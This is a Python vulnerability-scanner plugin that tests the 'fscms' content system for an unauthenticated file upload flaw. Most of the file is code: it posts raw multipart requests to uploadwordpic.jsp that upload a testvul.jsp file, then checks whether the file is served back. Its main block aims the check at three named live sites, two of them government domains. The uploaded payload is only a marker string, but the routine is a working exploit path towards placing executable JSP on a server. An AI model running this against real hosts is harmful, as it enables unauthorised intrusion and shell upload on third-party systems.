#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0144292
#__Author__ = 上善若水
#_PlugName_ = fscms Plugin
#_FileName_ = fscms.py


def assign(service, arg):
    if service == "fscms":
        return True, arg    

def audit(arg):
    raw0 = '''
POST /cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=C15EAE8ED9BBC3A9FA18D7D332D83ACF.tomcat1
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------276432152323220
Content-Length: 338

-----------------------------276432152323220
Content-Disposition: form-data; name="Filedata"; filename="testvul.jsp"
Content-Type: application/octet-stream

testvul_file_upload_test
-----------------------------276432152323220
Content-Disposition: form-data; name="Submit"

ä¸ä¼ 
-----------------------------276432152323220--

    '''
    raw1 = '''
POST /nlw/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------276973178631904
Content-Length: 338

-----------------------------276973178631904
Content-Disposition: form-data; name="Filedata"; filename="testvul.jsp"
Content-Type: application/octet-stream

testvul_file_upload_test
-----------------------------276973178631904
Content-Disposition: form-data; name="Submit"

ä¸ä¼ 
-----------------------------276973178631904--

    '''

    raw2 = '''
POST /fsm/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=A06E06E2D5DA6A04A699449099594E0C
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------171631986313562
Content-Length: 338

-----------------------------171631986313562
Content-Disposition: form-data; name="Filedata"; filename="testvul.jsp"
Content-Type: application/octet-stream

testvul_file_upload_test
-----------------------------171631986313562
Content-Disposition: form-data; name="Submit"

ä¸ä¼ 
-----------------------------171631986313562--

'''
    raws = [raw0,raw1,raw2]
    shell_paths = ['cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/','fsm/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/','nlw/cms/fileupload/uploadwordpic.jsp?AddWebInfoTID=111111&AddWebColumnID=2222&filepath=/app/']
    # proxy=('127.0.0.1',1234)
    # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
    
    for num in range(3):
        url = arg + shell_paths[num]
        raw = raws[num]
        code1, head1, res1, errcode1, _url1 = curl.curl2(url,raw=raw)
        # print url
        # print raw
        paths = ['fsm/app/testvul.jsp','app/testvul.jsp','nlw/app/testvul.jsp']
        for path in paths:
            final_shell_path = arg + path
            # print final_shell_path
            code2, head2, res2, errcode2, _url2 = curl.curl2(final_shell_path)
            if code2 == 200 and 'testvul_file_upload_test' in res2: 
                security_hole(final_shell_path)   
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('fscms', 'http://www.cre.cn/')[1])
    audit(assign('fscms', 'http://www.jznlw.gov.cn:8088/')[1])
    audit(assign('fscms', 'http://www.donation.gov.cn/')[1])